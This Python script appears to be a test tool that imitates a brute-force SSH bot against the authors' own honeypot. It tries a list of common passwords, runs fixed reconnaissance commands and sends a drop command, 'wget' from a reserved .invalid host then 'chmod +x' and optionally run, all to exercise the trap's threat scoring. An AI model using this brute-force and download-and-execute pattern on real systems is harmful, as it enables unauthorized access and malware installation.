"""a fast, regular bot against our own trap: a burst of failed logins, then a
fixed script of system info commands and a simulated download.

    python scripts/sim/sim_bot.py                  # one bot
    python scripts/sim/sim_bot.py -n 5             # five in parallel
    python scripts/sim/sim_bot.py --family mirai   # drops a file named after a known botnet
    python scripts/sim/sim_bot.py --run            # also runs the drop, which is critical

logs in as TEAM_SSH_USER, so every session is source=team.
"""

from __future__ import annotations

import argparse
import asyncio
import re
import time

import asyncssh

import common

# go's x/crypto ssh, what most real brute force bots send
CLIENT = "Go"
# throwaway guesses tried before the real team password. not real secrets
GUESSES = ["123456", "admin", "password", "root", "12345678", "qwerty", "1234"]
# fixed recon, the same every run
RECON = [
    "uname -s -v -n -r -m",
    "cat /proc/cpuinfo | grep name | wc -l",
    "free -m | grep Mem",
    "whoami",
    "nproc",
    "ls -lh $(which ls)",
]
# the download host is reserved (.invalid) and the trap only simulates it
DROP_HOST = "dl.bot-sim.invalid"
DROP_NAME = "x86"
# brain only searches names of 4+ plain characters
FAMILY_RE = re.compile(r"[A-Za-z0-9_-]{4,32}")
GAP_S = 0.3


def script(family: str | None = None, run: bool = False) -> list[str]:
    """recon, then the drop. without --run it stops at chmod, which keeps threat at high."""
    name = family or DROP_NAME
    drop = f"cd /tmp; wget http://{DROP_HOST}/{name}; chmod +x {name}" + (f"; ./{name}" if run else "")
    return RECON + [drop, "exit"]


def family_name(value: str) -> str:
    if not FAMILY_RE.fullmatch(value):
        raise argparse.ArgumentTypeError("use 4 to 32 letters, digits, - or _ (brain skips shorter names)")
    return value


class BurstClient(asyncssh.SSHClient):
    """answers password prompts with wrong guesses first, then the team password."""

    def __init__(self, guesses: list[str], real: str):
        self.queue = list(guesses) + [real]

    def password_auth_requested(self):
        return self.queue.pop(0) if self.queue else None


async def one(i: int, attempts: int, port: int, quiet: bool, lines: list[str]) -> dict:
    _, real = common.team_login()
    guesses = (GUESSES * 3)[:attempts]
    t0 = time.monotonic()
    conn = await common.connect(port, client_version=CLIENT, client_factory=lambda: BurstClient(guesses, real))
    async with conn:
        sh = await common.Shell.open(conn)
        for line in lines[:-1]:
            out = await sh.run(line)
            if not quiet:
                print(f"[bot {i}] $ {line}\n{out.rstrip()}" if out.strip() else f"[bot {i}] $ {line}")
            # same short gap every time, like a script
            await asyncio.sleep(GAP_S)
        await sh.close()
    took = time.monotonic() - t0
    print(f"[bot {i}] done: {attempts} failed logins, {len(lines) - 1} commands in {took:.1f}s")
    return {"client": CLIENT, "took": took}


async def main(n: int = 1, attempts: int = 4, port: int = common.DEFAULT_PORT, quiet: bool = False,
               family: str | None = None, run: bool = False) -> list[dict]:
    lines = script(family, run)
    results = await asyncio.gather(*(one(i + 1, attempts, port, quiet or n > 1, lines) for i in range(n)),
                                   return_exceptions=True)
    for i, r in enumerate(results, 1):
        if isinstance(r, common.NotAllowed):
            raise r
        if isinstance(r, Exception):
            print(f"[bot {i}] failed: {type(r).__name__}: {r}")
    return [r for r in results if isinstance(r, dict)]


def cli() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-n", type=int, default=1, help="bots to run in parallel (default 1)")
    ap.add_argument("--attempts", type=int, default=4, help="failed logins before the real one (default 4)")
    ap.add_argument("--port", type=int, default=common.DEFAULT_PORT)
    ap.add_argument("-q", "--quiet", action="store_true", help="only print a line per bot")
    ap.add_argument("--family", type=family_name, metavar="NAME",
                    help="name the dropped file after a known botnet, so brain's lookup finds write-ups")
    ap.add_argument("--run", action="store_true", help="also run the dropped file (threat goes critical)")
    a = ap.parse_args()
    common.run(main(max(1, a.n), max(0, a.attempts), a.port, a.quiet, a.family, a.run))


if __name__ == "__main__":
    cli()
